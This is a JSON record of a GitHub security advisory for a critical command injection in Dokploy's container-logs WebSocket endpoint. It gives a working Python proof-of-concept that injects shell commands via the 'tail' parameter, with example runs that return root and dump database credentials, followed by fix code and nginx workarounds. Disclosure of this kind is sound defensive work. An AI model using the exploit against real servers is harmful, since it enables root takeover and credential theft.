@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-wmqj-wr9q-327p",
+  "repo": {
+    "cve_id": "CVE-2026-45633",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.9,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "# Command Injection in /docker-container-logs Endpoint\r\n\r\n## Summary\r\n\r\nDokploy v0.26.6 contains a command injection vulnerability in the `/docker-container-logs` WebSocket endpoint. The `tail` and `since` parameters are not validated and are directly concatenated into shell commands, allowing authenticated users to execute arbitrary commands with root privileges.\r\n\r\n## Severity\r\n\r\n**CRITICAL (CVSS 9.9)**\r\n\r\n`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`\r\n\r\n## Affected Versions\r\n\r\n- Dokploy v0.26.6 (latest version)\r\n\r\n## Technical Details\r\n\r\n### Vulnerable Code\r\n\r\n**File**: `apps/dokploy/server/wss/docker-container-logs.ts`\r\n\r\n```typescript\r\n// Line 32-36: No validation for tail and since parameters\r\nconst tail = url.searchParams.get(\"tail\");\r\nconst since = url.searchParams.get(\"since\");\r\n\r\n// Line 114-122: Direct concatenation into shell command\r\nconst baseCommand = `docker container logs --timestamps --tail ${tail} --since ${since} --follow ${containerId}`;\r\n\r\n// Line 123: Executed via shell\r\nconst ptyProcess = spawn(shell, [\"-c\", command], {...});\r\n```\r\n\r\n### Proof of Concept\r\n\r\n```python\r\n#!/usr/bin/env python3\r\nimport asyncio\r\nfrom urllib.parse import quote\r\nimport websockets\r\n\r\nasync def exploit(target, cookie, cmd):\r\n    payload = f\"10; {cmd}; #\"\r\n    uri = f\"{target.replace('http','ws')}/docker-container-logs?containerId=dummy&tail={quote(payload)}\"\r\n\r\n    async with websockets.connect(uri, additional_headers={\"Cookie\": cookie}) as ws:\r\n        output = \"\"\r\n        while True:\r\n            try:\r\n                output += await asyncio.wait_for(ws.recv(), timeout=2)\r\n            except asyncio.TimeoutError:\r\n                break\r\n        return output\r\n\r\n# Usage: python3 poc.py http://target:3001 \"better-auth.session_token=xxx\" whoami\r\n```\r\n\r\n### Exploitation\r\n\r\n```bash\r\n# Execute whoami\r\n$ python3 poc.py http://localhost:3001 \"cookie\" whoami\r\nroot\r\n\r\n# Steal database credentials\r\n$ python3 poc.py http://localhost:3001 \"cookie\" \"env | grep DATABASE\"\r\nDATABASE_URL=postgresql://dokploy:dokploy123@postgres:5432/dokploy\r\n```\r\n\r\n### Command Execution Flow\r\n\r\n```\r\n1. Attacker payload: tail=10; whoami; #\r\n2. Command constructed: \"docker container logs --timestamps --tail 10; whoami; # --follow dummy\"\r\n3. Bash interprets:\r\n   - docker container logs --timestamps --tail 10  (fails)\r\n   - whoami                                         (executes successfully)\r\n   - # --follow dummy                               (commented out)\r\n4. Result: root\r\n```\r\n\r\n## Impact\r\n\r\n- **Remote Code Execution**: Execute arbitrary commands as root\r\n- **Credential Theft**: Steal database passwords and API keys\r\n- **Full System Compromise**: Complete control over the server\r\n- **Container Escape Risk**: Docker socket is mounted\r\n\r\n## Fix\r\n\r\n### Required Changes\r\n\r\n**File**: `apps/dokploy/server/wss/docker-container-logs.ts`\r\n\r\n```typescript\r\n// Add validation functions\r\nconst isValidTail = (tail: string): boolean => {\r\n    return /^\\d+$/.test(tail) && parseInt(tail) <= 10000;\r\n};\r\n\r\nconst isValidSince = (since: string): boolean => {\r\n    return since === \"all\" || /^\\d+[smhd]$/.test(since);\r\n};\r\n\r\n// Apply validation\r\nwssTerm.on(\"connection\", async (ws, req) => {\r\n    const containerId = url.searchParams.get(\"containerId\");\r\n    const tail = url.searchParams.get(\"tail\") || \"100\";\r\n    const since = url.searchParams.get(\"since\") || \"all\";\r\n\r\n    if (!containerId || !isValidContainerId(containerId)) {\r\n        ws.close(4000, \"Invalid container ID\");\r\n        return;\r\n    }\r\n\r\n    if (!isValidTail(tail)) {\r\n        ws.close(4000, \"Invalid tail parameter\");\r\n        return;\r\n    }\r\n\r\n    if (!isValidSince(since)) {\r\n        ws.close(4000, \"Invalid since parameter\");\r\n        return;\r\n    }\r\n\r\n    // Use parameter array instead of string concatenation\r\n    const args = [\"container\", \"logs\", \"--timestamps\", \"--tail\", tail];\r\n    if (since !== \"all\") args.push(\"--since\", since);\r\n    args.push(\"--follow\", containerId);\r\n\r\n    const ptyProcess = spawn(\"docker\", args, {...});\r\n});\r\n```\r\n\r\n## Workarounds\r\n\r\n### Block the endpoint (Nginx)\r\n\r\n```nginx\r\nlocation /docker-container-logs {\r\n    deny all;\r\n    return 403;\r\n}\r\n```\r\n\r\n### Restrict to internal network only\r\n\r\n```nginx\r\nlocation /docker-container-logs {\r\n    allow 192.168.1.0/24;\r\n    deny all;\r\n    # ... proxy config\r\n}\r\n```\r\n\r\n## References\r\n\r\n- Previous fix: [GHSA-vx6x-6559-x35r](https://github.com/Dokploy/dokploy/security/advisories/GHSA-vx6x-6559-x35r)\r\n- CWE-78: OS Command Injection\r\n- CWE-20: Improper Input Validation\r\n\r\n## Timeline\r\n\r\n- **2026-01-27**: v0.26.6 released with partial fix\r\n- **2026-01-30**: Incomplete validation discovered\r\n- **TBD**: Coordinated disclosure\r\n- **TBD**: Patch release in v0.26.7\r\n\r\n## Credits\r\n\r\nDiscovered by:JD-Security SHENYI Team\r\n\r\nDate: January 30, 2026\r\n",
+    "ghsa_id": "GHSA-wmqj-wr9q-327p",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-wmqj-wr9q-327p",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-wmqj-wr9q-327p"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-45633"
+      }
+    ],
+    "published_at": "2026-05-11T18:36:48Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Command Injection in /docker-container-logs Endpoint",
+    "updated_at": "2026-05-13T04:38:01Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "actions",
+          "name": ""
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "v0.26.6 "
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
